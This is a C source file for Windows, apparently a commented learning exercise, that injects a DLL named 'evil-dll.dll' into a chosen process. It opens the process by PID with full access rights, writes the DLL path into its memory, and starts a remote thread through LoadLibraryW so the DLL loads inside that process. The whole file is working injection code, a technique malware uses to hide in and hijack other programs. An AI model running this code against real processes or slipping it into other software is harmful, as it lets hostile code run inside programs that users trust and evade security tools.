#include <Windows.h>
#include <stdio.h>

int main(int argc, char* argv[]) {
    // Declare variables to hold the handle of the process and the remote buffer address
    HANDLE processHandle;
    PVOID remoteBuffer;

    // Define the path of the DLL to be injected. The TEXT macro converts this string to a wide-character string (wchar_t).
    wchar_t dllPath[] = TEXT("C:\\Users\\alexzevnoski\\source\\repos\\evil-dll\\ARM64\\Debug\\evil-dll.dll");

    // Print the process ID (PID) provided as an argument
    printf("Injecting DLL to PID: %i\n", atoi(argv[1]));

    // Open a handle to the process with the specified PID, allowing all access rights (PROCESS_ALL_ACCESS)
    // atoi(argv[1]) converts the PID passed as a string in the command-line argument to an integer
    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
    
    // Allocate memory in the target process's address space
    // This memory will hold the path to the DLL we're injecting.
    // MEM_COMMIT allocates physical memory, and PAGE_READWRITE allows reading and writing to the allocated memory.
    remoteBuffer = VirtualAllocEx(
        processHandle,       // Handle to the target process
        NULL,                // Let the system choose the address for the memory block
        sizeof dllPath,      // Size of the memory block (enough to hold the DLL path)
        MEM_COMMIT,          // Commit the memory allocation
        PAGE_READWRITE       // Allow reading and writing to the memory
    );

    // Write the DLL path into the allocated memory in the target process
    // This places the wide-character DLL path string in the remote buffer in the target process
    WriteProcessMemory(
        processHandle,       // Handle to the target process
        remoteBuffer,        // Address of the allocated memory in the target process
        (LPVOID)dllPath,     // Pointer to the DLL path (cast to LPVOID)
        sizeof(dllPath),     // Size of the data being written (the DLL path)
        NULL                 // We don't need to store the number of bytes written, so we pass NULL
    );

    // Get the address of the LoadLibraryW function in Kernel32.dll
    // LoadLibraryW is used because we are injecting a wide-character string for the DLL path.
    // The address of this function will be used to create a thread in the target process.
    PTHREAD_START_ROUTINE threadStartRoutineAddress = 
        (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");

    // Create a remote thread in the target process to execute the LoadLibraryW function
    // This causes the target process to load the specified DLL (located at remoteBuffer).
    CreateRemoteThread(
        processHandle,              // Handle to the target process
        NULL,                       // No security attributes (default)
        0,                          // Default stack size
        threadStartRoutineAddress,   // Address of LoadLibraryW (the function to be executed in the remote process)
        remoteBuffer,               // Argument to LoadLibraryW (the address of the DLL path in the target process)
        0,                          // Default creation flags (0 means the thread will run immediately)
        NULL                        // No need to store the thread ID
    );

    // Close the handle to the target process, cleaning up resources
    CloseHandle(processHandle);
    
    return 0;
}